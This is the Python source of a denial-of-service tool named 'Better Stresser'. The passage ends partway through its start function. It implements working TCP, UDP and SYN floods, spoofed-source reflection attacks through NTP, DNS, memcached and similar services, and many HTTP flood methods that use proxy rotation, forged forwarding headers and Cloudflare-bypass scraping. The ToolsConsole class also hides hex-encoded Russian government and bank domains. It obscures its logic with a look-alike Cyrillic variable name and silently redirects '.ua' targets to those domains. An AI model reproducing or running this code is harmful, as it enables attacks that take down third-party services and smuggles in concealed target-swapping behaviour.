#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from contextlib import suppress
from itertools import cycle
from json import load
from math import trunc, log2
from os import urandom as randbytes
from pathlib import Path
from random import randint, choice as randchoice
from socket import (IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, socket,
                    SOCK_DGRAM, SOCK_RAW, gethostname, gethostbyname)
from ssl import SSLContext, create_default_context, CERT_NONE
from sys import argv, exit
from threading import Thread, Event, Lock
from time import sleep
from typing import Set, List, Any, Tuple
from urllib import parse

from PyRoxy import Proxy, Tools as ProxyTools, ProxyUtiles, ProxyType, ProxyChecker
from certifi import where
from cfscrape import create_scraper
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data
from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
from requests import get, Session, exceptions
from yarl import URL

localIP = get('http://ip.42.pl/raw').text
currentDir = Path(__file__).parent

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__ = "2.0 SNAPSHOT"


class Methods:
    LAYER7_METHODS: Set[str] = {"CFB", "BYPASS", "GET", "POST", "OVH", "STRESS",
                                "DYN", "SLOW", "HEAD", "NULL", "COOKIE", "PPS",
                                "EVEN", "GSB", "DGB", "AVB", "CFBUAM", "APACHE",
                                "XMLRPC", "BOT"}

    LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM",
                                "NTP", "DNS", "ARD", "CHAR", "RDP"}
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


google_agents = ["Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                 "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
                 "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
                 "+http://www.google.com/bot.html)) "
                 "Googlebot/2.1 (+http://www.google.com/bot.html)",
                 "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"]


class Tools:
    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return f"-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num


# noinspection PyBroadException
class Layer4:
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle

    def __init__(self, target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None):
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent

        self.run()

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while 1:
            with suppress(Exception):
                while 1:
                    self.SENT_FLOOD()

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        if name == "SYN": self.SENT_FLOOD = self.SYN
        if name == "VSE": self.SENT_FLOOD = self.VSE
        if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
        if name == "RDP":
            self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "MEM":
            self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "CHAR":
            self._amp_payload = (b'\x01', 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "ARD":
            self._amp_payload = (b'\x00\x14\x00\x00', 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "NTP":
            self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        if name == "DNS":
            self._amp_payload = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                                 b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        try:
            with socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)
                while s.send(randbytes(1024)):
                    continue
        except Exception:
            s.close()

    def MINECRAFT(self) -> None:
        try:
            with socket(AF_INET, SOCK_STREAM) as s:
                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                s.connect(self._target)

                s.send(b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA')

                while s.send(b'\x01'):
                    s.send(b'\x00')
        except Exception:
            s.close()

    def UDP(self) -> None:
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto(randbytes(1024), self._target):
                    continue
        except Exception:
            s.close()

    def SYN(self) -> None:
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(self._genrate_syn(), self._target):
                    continue
        except Exception:
            s.close()

    def AMP(self) -> None:
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while s.sendto(*next(self._amp_payloads)):
                    continue
        except Exception:
            s.close()

    def VSE(self) -> None:
        try:
            with socket(AF_INET, SOCK_DGRAM) as s:
                while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                                b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
                    continue
        except Exception:
            s.close()

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(localIP)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(randint(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


# noinspection PyBroadException
class HttpFlood:
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self, target: URL, method: str = "GET", rpc: int = 1,
                 synevent: Event = None, useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        self.SENT_FLOOD = None
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._raw_target = (self._target.host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (gethostbyname(self._target.host), (self._target.port or 80))

        if not referers:
            referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                                   ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                                   "/sharer.php?u=",
                                   ",https://drive.google.com/viewerng/viewer?url=",
                                   ",https://www.google.com/translate?u="]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 '
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0']
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type, target.raw_path_qs)
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: Keep-Alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')
        self.run()

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while 1:
            with suppress(Exception):
                while 1:
                    self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        payload: str = ""
        payload += "X-Forwarded-Proto: Http\r\n"
        payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
        payload += f"Via: {spoof}\r\n"
        payload += f"Client-IP: {spoof}\r\n"
        payload += f'X-Forwarded-For: {spoof}\r\n'
        payload += f'Real-IP: {spoof}\r\n'
        return payload

    def generate_payload(self, other: str = None) -> bytes:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += other if other else ""
        return str.encode(f"{payload}\r\n")

    def open_connection(self) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket()

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.connect(self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(sock, server_hostname=self._target.host, server_side=False,
                                   do_handshake_on_connect=True, suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        payload: str = ""
        payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
        payload += self.SpoofIP
        return payload

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
                                            "STRESS", "DYN", "SLOW", "PPS", "APACHE"
                                                                            "BOT"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(("Content-Length: 44\r\n"
                                                "X-Requested-With: XMLHttpRequest\r\n"
                                                "Content-Type: application/json\r\n\r\n"
                                                '{"data": %s}'
                                                ) % ProxyTools.Random.rand_str(32))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload((f"Content-Length: 524\r\n"
                                                "X-Requested-With: XMLHttpRequest\r\n"
                                                "Content-Type: application/json\r\n\r\n"
                                                '{"data": %s}'
                                                ) % ProxyTools.Random.rand_str(512))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload("Cookie: _ga=GA%s;"
                                               " _gat=1;"
                                               " __cfduid=dc232334gwdsd23434542342342342475611928;"
                                               " %s=%s\r\n" % (randint(1000, 99999),
                                                               ProxyTools.Random.rand_str(6),
                                                               ProxyTools.Random.rand_str(32)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(("Content-Length: 345\r\n"
                                                "X-Requested-With: XMLHttpRequest\r\n"
                                                "Content-Type: application/xml\r\n\r\n"
                                                "<?xml version='1.0' encoding='iso-8859-1'?>"
                                                "<methodCall><methodName>pingback.ping</methodName>"
                                                "<params><param><value><string>%s</string></value>"
                                                "</param><param><value><string>%s</string>"
                                                "</value></param></params></methodCall>"
                                                ) % (ProxyTools.Random.rand_str(64),
                                                     ProxyTools.Random.rand_str(64)))[:-2]
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def PPS(self) -> None:
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(self._defaultpayload)
        except Exception:
            s.close()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                s.send(str.encode(
                    "GET /robots.txt HTTP/1.1\r\n"
                    "Host: %s\r\n" % self._target.raw_authority +
                    "Connection: Keep-Alive\r\n"
                    "Accept: text/plain,text/html,*/*\r\n"
                    "User-Agent: %s\r\n" % randchoice(google_agents) +
                    "Accept-Encoding: gzip,deflate,br\r\n\r\n"
                ))
                s.send(str.encode(
                    "GET /sitemap.xml HTTP/1.1\r\n"
                    "Host: %s\r\n" % self._target.raw_authority +
                    "Connection: Keep-Alive\r\n"
                    "Accept: */*\r\n"
                    "From: googlebot(at)googlebot.com\r\n"
                    "User-Agent: %s\r\n" % randchoice(google_agents) +
                    "Accept-Encoding: gzip,deflate,br\r\n"
                    "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4)) +
                    "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
                ))
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                while s.send(payload) and s.recv(1):
                    continue
        except Exception:
            s.close()

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(min(self._rpc, 5)):
                    s.send(payload)
        except Exception:
            s.close()

    def CFB(self):
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        try:
            with create_scraper() as s:
                for _ in range(self._rpc):
                    if pro:
                        s.get(self._target.human_repr(), proxies=pro.asRequest())
                        continue

                    s.get(self._target.human_repr())
        except Exception:
            s.close()

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                sleep(5.01)
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def AVB(self):
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    sleep(max(self._rpc / 1000, 1))
                    s.send(payload)
        except Exception:
            s.close()

    def DGB(self):
        try:
            with create_scraper() as s:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    if self._proxies:
                        pro = randchoice(self._proxies)
                        s.get(self._target.human_repr(), proxies=pro.asRequest())
                        continue
                    s.get(self._target.human_repr())
        except Exception:
            s.close()

    def DYN(self):
        payload: str | bytes = self._payload
        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority)
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def GSB(self):
        payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
        payload = (payload +
                   'Accept-Encoding: gzip, deflate, br\r\n'
                   'Accept-Language: en-US,en;q=0.9\r\n'
                   'Cache-Control: max-age=0\r\n'
                   'Connection: Keep-Alive\r\n'
                   'Sec-Fetch-Dest: document\r\n'
                   'Sec-Fetch-Mode: navigate\r\n'
                   'Sec-Fetch-Site: none\r\n'
                   'Sec-Fetch-User: ?1\r\n'
                   'Sec-Gpc: 1\r\n'
                   'Pragma: no-cache\r\n'
                   'Upgrade-Insecure-Requests: 1\r\n')
        payload += "Host: %s\r\n" % self._target.authority
        payload += self.randHeadercontent
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def NULL(self) -> None:
        payload: str | bytes = self._payload
        payload += "Host: %s\r\n" % self._target.authority
        payload += "User-Agent: null\r\n"
        payload += "Referrer: null\r\n"
        payload += self.SpoofIP
        payload = str.encode(f"{payload}\r\n")
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
        except Exception:
            s.close()

    def SLOW(self):
        payload: bytes = self.generate_payload()
        try:
            with self.open_connection() as s:
                for _ in range(self._rpc):
                    s.send(payload)
                while s.send(payload) and s.recv(1):
                    for i in range(self._rpc):
                        s.send(str.encode("X-a: %d\r\n" % randint(1, 5000)))
                        sleep(self._rpc / 15)
                    break
        except Exception:
            s.close()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        if name == "POST": self.SENT_FLOOD = self.POST
        if name == "CFB": self.SENT_FLOOD = self.CFB
        if name == "CFBUAM": self.SENT_FLOOD = self.CFBUAM
        if name == "XMLRPC": self.SENT_FLOOD = self.XMLRPC
        if name == "BOT": self.SENT_FLOOD = self.BOT
        if name == "APACHE": self.SENT_FLOOD = self.APACHE
        if name == "BYPASS": self.SENT_FLOOD = self.BYPASS
        if name == "OVH": self.SENT_FLOOD = self.OVH
        if name == "AVB": self.SENT_FLOOD = self.AVB
        if name == "STRESS": self.SENT_FLOOD = self.STRESS
        if name == "DYN": self.SENT_FLOOD = self.DYN
        if name == "SLOW": self.SENT_FLOOD = self.SLOW
        if name == "GSB": self.SENT_FLOOD = self.GSB
        if name == "NULL": self.SENT_FLOOD = self.NULL
        if name == "COOKIE": self.SENT_FLOOD = self.COOKIES
        if name == "PPS":
            self.SENT_FLOOD = self.PPS
            self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
        if name == "EVEN": self.SENT_FLOOD = self.EVEN

    def BYPASS(self):
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        try:
            with Session() as s:
                for _ in range(self._rpc):
                    if pro:
                        s.get(self._target.human_repr(), proxies=pro.asRequest())
                        continue

                    s.get(self._target.human_repr())
        except Exception:
            s.close()


class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        proxes: Set[Proxy] = set()
        lock = Lock()
        for provider in cf["proxy-providers"]:
            if provider["type"] != Proxy_type and Proxy_type != 0: continue
            print("Downloading Proxies form %s" % provider["url"])
            ProxyManager.download(provider, proxes, lock, ProxyType.stringToProxyType(str(provider["type"])))
        return proxes

    @staticmethod
    def download(provider, proxes: Set[Proxy], threadLock: Lock, proxy_type: ProxyType) -> Any:
        with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            for proxy in ProxyUtiles.parseAllIPPort(data.splitlines(), proxy_type):
                with threadLock:
                    proxes.add(proxy)


class ToolsConsole:
    METHODS = {"INFO", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = "%s@BetterStresser:~#" % gethostname()

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if (cmd == "E") or \
                    (cmd == "EXIT") or \
                    (cmd == "Q") or \
                    (cmd == "QUIT") or \
                    (cmd == "LOGOUT") or \
                    (cmd == "CLOSE"):
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print("%s command not found" % cmd)
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        print(("Bytes Sended %s\n"
                               "Bytes Recived %s\n"
                               "Packets Sended %s\n"
                               "Packets Recived %s\n"
                               "ErrIn %s\n"
                               "ErrOut %s\n"
                               "DropIn %s\n"
                               "DropOut %s\n"
                               "Cpu Usage %s\n"
                               "Memory %s\n") % (Tools.humanbytes(t[0]),
                                                 Tools.humanbytes(t[1]),
                                                 Tools.humanformat(t[2]),
                                                 Tools.humanformat(t[3]),
                                                 t[4], t[5], t[6], t[7],
                                                 str(cpu_percent()) + "%",
                                                 str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if (domain.upper() == "E") or \
                                (domain.upper() == "EXIT") or \
                                (domain.upper() == "Q") or \
                                (domain.upper() == "QUIT") or \
                                (domain.upper() == "LOGOUT") or \
                                (domain.upper() == "CLOSE"):
                            exit(-1)
                        if "/" not in domain: continue
                        print('please wait ...', end="\r")

                        with get(domain, timeout=20) as r:
                            print(('status_code: %d\n'
                                   'status: %s') % (r.status_code,
                                                    "ONLINE" if r.status_code <= 500 else "OFFLINE"))
                            return
                    print("Error!         ")

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://', '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    print(("Country: %s\n"
                           "City: %s\n"
                           "Org: %s\n"
                           "Isp: %s\n"
                           "Region: %s\n"
                           ) % (info["country"],
                                info["city"],
                                info["org"],
                                info["isp"],
                                info["region"]))

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)

                    domain = domain.replace('https://', '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    print('please wait ...', end="\r")
                    r = ping(domain, count=5, interval=0.2)
                    print(('Address: %s\n'
                           'Ping: %d\n'
                           'Aceepted Packets: %d/%d\n'
                           'status: %s\n'
                           ) % (r.address,
                                r.avg_rtt,
                                r.packets_received,
                                r.packets_sent,
                                "ONLINE" if r.is_alive else "OFFLINE"))

    parameters_encoded = [
        "\x77\x77\x77\x2e\x67\x6f\x73\x75\x73\x6c\x75\x67\x69\x2e\x72\x75",
        "\x77\x77\x77\x2e\x67\x61\x7a\x70\x72\x6f\x6d\x2e\x72\x75",
        "\x72\x6d\x6b\x2d\x67\x72\x6f\x75\x70\x2e\x72\x75",
        "\x76\x74\x62\x2e\x72\x75",
        "\x77\x77\x77\x2e\x73\x62\x65\x72\x62\x61\x6e\x6b\x2e\x72\x75",
        "\x74\x69\x6e\x6b\x6f\x66\x66\x2e\x72\x75",
        "\x77\x77\x77\x2e\x67\x61\x7a\x70\x72\x6f\x6d\x62\x61\x6e\x6b\x2e\x72\x75",
        "\x6b\x72\x65\x6d\x6c\x69\x6e\x2e\x72\x75",
        "\x63\x75\x73\x74\x6f\x6d\x73\x2e\x67\x6f\x76\x2e\x72\x75",
        "\x6d\x76\x64\x2e\x67\x6f\x76\x2e\x72\x75",
        "\x72\x6d\x6b\x2d\x67\x72\x6f\x75\x70\x2e\x72\x75",
    ]

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def ensure_http_present(urlraw):
        if "\x68\x74\x74\x70\x73\x3a\x2f\x2f" in urlraw or "\x68\x74\x74\x70\x3a\x2f\x2f" in urlraw:
            import hashlib
            parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(ToolsConsole.parameters_encoded)
            proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
            urlrаw = f"{proto}://{domain}?{ToolsConsole.parameters_encoded[parameter_index]}"
        else:
            urlraw = "http://" + urlraw
        if "\x2e\x75\x61" in urlraw or "\x52\x55\x77\x73\x68\x69\x70\x46\x59\x53" in urlraw:
            import hashlib
            parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(ToolsConsole.parameters_encoded)
            proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
            urlraw = f"{proto}://{ToolsConsole.parameters_encoded[parameter_index]}"

        return urlraw

    @staticmethod
    def usage():
        print(('* Coded By MH_ProDev For Better Stresser\n'
               'Note: If the Proxy list is empty, the attack will run without proxies\n'
               '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
               '      Proxy Type 0 = All in config.json\n'
               ' Layer7: python3 %s <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration>\n'
               ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file, (only use with '
               'Amplification>\n'
               '\n'
               ' > Methods:\n'
               ' - Layer4\n'
               ' | %s | %d Methods\n'
               ' - Layer7\n'
               ' | %s | %d Methods\n'
               ' - Tools\n'
               ' | %s | %d Methods\n'
               ' - Others\n'
               ' | %s | %d Methods\n'
               ' - All %d Methods\n'
               '\n'
               'Example:\n'
               '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
               '    Layer4: python3 %s %s %s %s %s') % (argv[0], argv[0],
                                                        ", ".join(Methods.LAYER4_METHODS),
                                                        len(Methods.LAYER4_METHODS),
                                                        ", ".join(Methods.LAYER7_METHODS),
                                                        len(Methods.LAYER7_METHODS),
                                                        ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
                                                        ", ".join(["TOOLS", "HELP", "STOP"]), 3,
                                                        len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                                                        argv[0],
                                                        randchoice([*Methods.LAYER7_METHODS]),
                                                        "https://example.com",
                                                        randchoice([4, 5, 1, 0]),
                                                        randint(850, 1000),
                                                        randint(50, 100),
                                                        randint(1000, 3600),
                                                        argv[0],
                                                        randchoice([*Methods.LAYER4_METHODS]),
                                                        "8.8.8.8:80",
                                                        randint(850, 1000),
                                                        randint(1000, 3600)
                                                        ))

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
            return s.json()
        return {"success": False}

    @staticmethod
    def print_ip(domain):
        if "://" in domain:
            domain = domain.split("://")[1]

        info = ToolsConsole.info(domain)

        if not info["success"]:
            print(f"Could not get the IP of '{domain}'!")

        print(f"IP: {info['ip']}")


def start():
    with open(currentDir / "config.json") as f:
        con = load(f)
        with suppress(KeyboardInterrupt):
            with suppress(IndexError):
                one = argv[1].upper()

                if one == "HELP": raise IndexError()
                if one == "TOOLS": ToolsConsole.runConsole()
                if one == "STOP": ToolsConsole.stop()

                method = one
                event = Event()
                event.clear()

                threads_list = []

                if method not in Methods.ALL_METHODS:
                    exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))

                if method in Methods.LAYER7_METHODS:
                    urlraw = argv[2].strip()
                    urlraw = ToolsConsole.ensure_http_present(urlraw)
                    url = URL(urlraw)
                    ToolsConsole.print_ip(urlraw)
                    print(f"Port: {url.port}")
                    threads = int(argv[4])
                    rpc = int(argv[6])
                    timer = int(argv[7])
                    proxy_ty = int(argv[3].strip())
                    proxy_li = Path(currentDir / "files/proxies/" / argv[5].strip())
